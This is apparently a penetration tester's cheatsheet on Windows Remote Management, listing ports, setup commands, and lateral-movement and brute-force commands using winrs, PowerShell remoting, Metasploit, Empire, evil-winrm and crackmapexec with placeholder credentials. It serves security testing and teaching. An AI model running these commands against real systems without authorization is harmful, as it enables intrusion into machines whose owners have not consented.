# WinRM


Windows Remote Management Protocol found on Windows machines on TCP Ports 5985 and 5986. [Microsoft Winrm documentation](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) *"Windows Remote Management (WinRM) is the Microsoft implementation of the [WS-Management protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol), which is a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows interoperation between hardware and operating systems from different vendors."*

- Port 5985 for [[HTTP]] transport 
- Port 5986 for [[HTTPS]] Transport.

Configuring WinRM on a Windows Host:
```powershell
# WinrRM Service need to be Enabled on both Server and Client machines
# evil-winrm is a default kali package 
Enable-PSRemoting -force
winrm quickconfig -transport:https
Set-Item wsman:\localhost\client\trustedhosts * 
Restart-Service WinRM
```
Test connectivity
```powershell
test-wsman -computername "%EXTERNALHOSTNAME%"
test-wsman -computername "10.10.10.10"
```

[[Lateral-Movement]] with `winrs`
```powershell
# execute a command on a remote machine as a authenticated user
winrs -r:10.10.10.10 -u:$domain.$tld$\administrator -p:password123! $cmd
# similiarly with PowerShell
Invoke-Command -ComputerName "10.10.10.10" -Credential workgroup\administrator -Authentication Negotiate -Port 5985 -ScriptBlock {net user administrator}
# Get a PowerShell Remote Session 
# Credential objects in PowerShell
Enter-PSSession -ComputerName 10.10.10.10 -Credential administrator
```

[[PowerShell]] Credential making -  [a73xsh](https://gist.github.com/a73xsh/59463149c50d75c3a25889cf20823f8e)
```powershell
$user = "addyouruser"
$pass = convertto-securestring -asplaintext -force -string ""
$cred = new-object -typename system.management.automation.pscredential($user,$pass)
$session = newpssession -computername dc01 -credential $cred
enter-pssession -session $sessions
# Sometimes you need to use invoke command instead of $session creation due to shell limitations
invoke-command -computername $computername -ScriptBlock { hostname }  -Credential $cred
# PSRemoting may require a specific configuration:
-ConfigurationName $configName
```


[[Metasploit]] Auxiliary modules for WinRM:
```ruby
# Identify authentication method:
use auxiliary/scanner/winrm/winrm_auth_methods
msf auxiliary(winrm_auth_methods) > set rhosts 10.10.10.10
# Brute Force
use auxiliary/scanner/winrm/winrm_login
# WMI Queries
auxiliary/scanner/winrm/winrm_wql
# Run winrm commands
auxiliary/scanner/winrm/winrm_cmd
# Get a shell
auxiliary/scanner/winrm/winrm_script_exec
```
Consult the and any later version of Documentation regarding Metasploit: [rapid7 - abusing-windows-remote-management-winrm-with-metasploit ](https://www.rapid7.com/blog/post/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit/)


[[Empire]] with [[Powershell-Empire-Modules]]
```powershell
usemodule lateral_movement/invoke_psremoting
set Listener http
set ComputerName 10.10.10.10
set UserName administrator
set Password password123
execute
```

According to [Raj Chandel: hackingarticles.in/winrm-penetration-testing](https://www.hackingarticles.in/winrm-penetration-testing/) there is *"Docker image of PowerShell with NTLM support to allow for PS-Remoting from Linux to Windows*
```bash
docker run -it quickbreach/powershell-ntlm
```

"Good" winrm 
```bash
gem install winrm
ruby winrm-shell.rb
```

See [[evil-winrm-Cheatsheet]] and [[Crackmapexec-Cheatsheet]] for more detail.
```bash
evil-winrm -i $IP -u $USER -p $PASS
crackmapexec winrm -u Administrator -p 'P@$$w0rd123!'
```

## References

[Microsoft Winrm documentation](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)
[csbygb.gitbook.io - winrm](https://csbygb.gitbook.io/pentips/networking-protocols-and-network-pentest/winrm)
[Kali Tools evil-winrm](https://www.kali.org/tools/evil-winrm/)
[a73xsh](https://gist.github.com/a73xsh/59463149c50d75c3a25889cf20823f8e)
[Raj Chandel: hackingarticles.in/winrm-penetration-testing](https://www.hackingarticles.in/winrm-penetration-testing/) 
[rapid7 - abusing-windows-remote-management-winrm-with-metasploit ](https://www.rapid7.com/blog/post/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit/)